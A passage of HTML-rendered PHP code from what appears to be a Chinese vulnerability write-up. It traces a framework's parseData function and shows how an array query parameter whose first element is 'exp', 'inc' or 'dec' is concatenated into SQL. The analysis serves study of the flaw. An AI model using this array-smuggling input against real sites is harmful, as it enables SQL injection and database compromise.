class="cm-variable-2">$this</span><span class="cm-operator">-&gt;</span><span class="cm-variable">insertSql</span>);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">20</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">21</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">return</span> <span class="cm-variable-2">$sql</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">22</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  }</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 493px;"></div><div class="CodeMirror-gutters" style="height: 493px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 35px;"></div></div></div></div></pre><p><span>先转到看一下数据的解析</span><code>$data = $this-&gt;parseData($data, $options)</code></p><p><span>假设我们传入的是</span><code>?name[0]=username&amp;name[1]=password&amp;name[2]=123456</code></p><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded md-focus" spellcheck="false" lang="php" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap CodeMirror-focused" lang="php"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 614px; left: 527.7px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 36px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre>x</pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="" style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-keyword">protected</span> <span class="cm-keyword">function</span> <span class="cm-def">parseData</span>(<span class="cm-variable-2">$data</span>, <span class="cm-variable-2">$options</span>)</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  {</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">if</span> (<span class="cm-keyword">empty</span>(<span class="cm-variable-2">$data</span>)) {</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">return</span> [];</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  }</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-comment">// 获取绑定信息</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-2">$bind</span> <span class="cm-operator">=</span> <span class="cm-variable-2">$this</span><span class="cm-operator">-&gt;</span><span class="cm-variable">query</span><span class="cm-operator">-&gt;</span><span class="cm-variable">getFieldsBind</span>(<span class="cm-variable-2">$options</span>[<span class="cm-string">'table'</span>]);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">9</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">if</span> (<span class="cm-string">'*'</span> <span class="cm-operator">==</span> <span class="cm-variable-2">$options</span>[<span class="cm-string">'field'</span>]) {</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">10</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-2">$fields</span> <span class="cm-operator">=</span> <span class="cm-builtin">array_keys</span>(<span class="cm-variable-2">$bind</span>);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">11</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  } <span class="cm-keyword">else</span> {</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">12</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-2">$fields</span> <span class="cm-operator">=</span> <span class="cm-variable-2">$options</span>[<span class="cm-string">'field'</span>];</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">13</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  }</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">14</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp=""></span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">15</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-2">$result</span> <span class="cm-operator">=</span> [];</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">16</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;<span class="cm-comment">#这里遍历了数组 此时的数组是Array ( [username] =&gt; Array ( [0] =&gt; username [1] =&gt; password [2] =&gt; 123456 ) ) </span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">17</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">foreach</span> (<span class="cm-variable-2">$data</span> <span class="cm-keyword">as</span> <span class="cm-variable-2">$key</span> <span class="cm-operator">=&gt;</span> <span class="cm-variable-2">$val</span>) {</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">18</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-comment">#$key username</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">19</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-comment">#$val Array ( [0] =&gt; username [1] =&gt; password [2] =&gt; 123456 ) </span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">20</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-2">$item</span> <span class="cm-operator">=</span> <span class="cm-variable-2">$this</span><span class="cm-operator">-&gt;</span><span class="cm-variable">parseKey</span>(<span class="cm-variable-2">$key</span>, <span class="cm-variable-2">$options</span>);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">21</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-comment">#$item=`username`</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">22</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-comment">#这里的$val是数组所以跳过</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">23</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">if</span> (<span class="cm-builtin">is_object</span>(<span class="cm-variable-2">$val</span>) <span class="cm-operator">&amp;&amp;</span> <span class="cm-variable">method_exists</span>(<span class="cm-variable-2">$val</span>, <span class="cm-string">'__toString'</span>)) {</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">24</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-comment">// 对象数据写入</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">25</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-2">$val</span> <span class="cm-operator">=</span> <span class="cm-variable-2">$val</span><span class="cm-operator">-&gt;</span><span class="cm-variable">__toString</span>();</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">26</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  }</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">27</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-comment">#如果字段名含有.或者字段名不在$fileds则报错</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">28</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">if</span> (<span class="cm-atom">false</span> <span class="cm-operator">===</span> <span class="cm-builtin">strpos</span>(<span class="cm-variable-2">$key</span>, <span class="cm-string">'.'</span>) <span class="cm-operator">&amp;&amp;</span> <span class="cm-operator">!</span><span class="cm-builtin">in_array</span>(<span class="cm-variable-2">$key</span>, <span class="cm-variable-2">$fields</span>, <span class="cm-atom">true</span>)) <span class="">{</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">29</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">if</span> (<span class="cm-variable-2">$options</span>[<span class="cm-string">'strict'</span>]) {</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">30</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">throw</span> <span class="cm-keyword">new</span> <span class="cm-variable">Exception</span>(<span class="cm-string">'fields not exists:['</span> . <span class="cm-variable-2">$key</span> . <span class="cm-string">']'</span>);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">31</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  }</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">32</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  } <span class="cm-keyword">elseif</span> (<span class="cm-builtin">is_null</span>(<span class="cm-variable-2">$val</span>)) {</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">33</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-2">$result</span>[<span class="cm-variable-2">$item</span>] <span class="cm-operator">=</span> <span class="cm-string">'NULL'</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">34</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  } <span class="cm-keyword">elseif</span> (<span class="cm-builtin">is_array</span>(<span class="cm-variable-2">$val</span>) <span class="cm-operator">&amp;&amp;</span> <span class="cm-operator">!</span><span class="cm-keyword">empty</span>(<span class="cm-variable-2">$val</span>)) { <span class="cm-comment">#跟进到这里</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">35</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-comment">#这里如果$val[0]的值是下面三个中的一个则进行了拼接</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">36</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">switch</span> (<span class="cm-variable-2">$val</span>[<span class="cm-number">0</span>]) {</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">37</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">case</span> <span class="cm-string">'exp'</span>:</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">38</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-2">$result</span>[<span class="cm-variable-2">$item</span>] <span class="cm-operator">=</span> <span class="cm-variable-2">$val</span>[<span class="cm-number">1</span>];</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">39</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">break</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">40</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">case</span> <span class="cm-string">'inc'</span>:</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">41</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-2">$result</span>[<span class="cm-variable-2">$item</span>] <span class="cm-operator">=</span> <span class="cm-variable-2">$this</span><span class="cm-operator">-&gt;</span><span class="cm-variable">parseKey</span>(<span class="cm-variable-2">$val</span>[<span class="cm-number">1</span>]) . <span class="cm-string">'+'</span> . <span class="cm-builtin">floatval</span>(<span class="cm-variable-2">$val</span>[<span class="cm-number">2</span>]);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">42</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">break</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">43</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">case</span> <span class="cm-string">'dec'</span>:</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">44</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-2">$result</span>[<span class="cm-variable-2">$item</span>] <span class="cm-operator">=</span> <span class="cm-variable-2">$this</span><span class="cm-operator">-&gt;</span><span class="cm-variable">parseKey</span>(<span class="cm-variable-2">$val</span>[<span class="cm-number">1</span>]) . <span class="cm-string">'-'</span> . <span class="cm-builtin">floatval</span>(<span class="cm-variable-2">$val</span>[<span class="cm-number">2</span>]);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">45</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">break</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">46</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  }</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">47</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  } <span class="cm-keyword">elseif</span> (<span class="cm-builtin">is_scalar</span>(<span class="cm-variable-2">$val</span>)) {</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">48</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-comment">// 过滤非标量数据</span></span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">49</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-keyword">if</span> (<span class="cm-number">0</span> <span class="cm-operator">===</span> <span class="cm-builtin">strpos</span>(<span class="cm-variable-2">$val</span>, <span class="cm-string">':'</span>) <span class="cm-operator">&amp;&amp;</span> <span class="cm-variable-2">$this</span><span class="cm-operator">-&gt;</span><span class="cm-variable">query</span><span class="cm-operator">-&gt;</span><span class="cm-variable">isBind</span>(<span class="cm-builtin">substr</span>(<span class="cm-variable-2">$val</span>, <span class="cm-number">1</span>))) {</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 27px;">50</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-2">$result</span>[<span class="cm-variable-2">$item</span>] <span class="cm-operator">=</span> <span class="cm-variable-2">$val</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">51</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  } <span class="cm-keyword">else</span> {</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">52</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-2">$key</span> <span class="cm-operator">=</span> <span class="cm-builtin">str_replace</span>(<span class="cm-string">'.'</span>, <span class="cm-string">'_'</span>, <span class="cm-variable-2">$key</span>);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">53</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-2">$this</span><span class="cm-operator">-&gt;</span><span class="cm-variable">query</span><span class="cm-operator">-&gt;</span><span class="cm-variable">bind</span>(<span class="cm-string">'data__'</span> . <span class="cm-variable-2">$key</span>, <span class="cm-variable-2">$val</span>, <span class="cm-keyword">isset</span>(<span class="cm-variable-2">$bind</span>[<span class="cm-variable-2">$key</span>]) <span class="cm-operator">?</span> <span class="cm-variable-2">$bind</span>[<span class="cm-variable-2">$key</span>] : <span class="cm-variable">PDO</span>::<span class="cm-variable">PARAM_STR</span>);</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">54</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable-2">$result</span>[<span class="cm-variable-2">$item</span>] <span class="cm-operator">=</span> <span class="cm-string">':data__'</span> . <span class="cm-variable-2">$key</span>;</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">55</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  }</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -36px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 27px;">56</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  }</span></pre></div><div style="position: relative;"><div 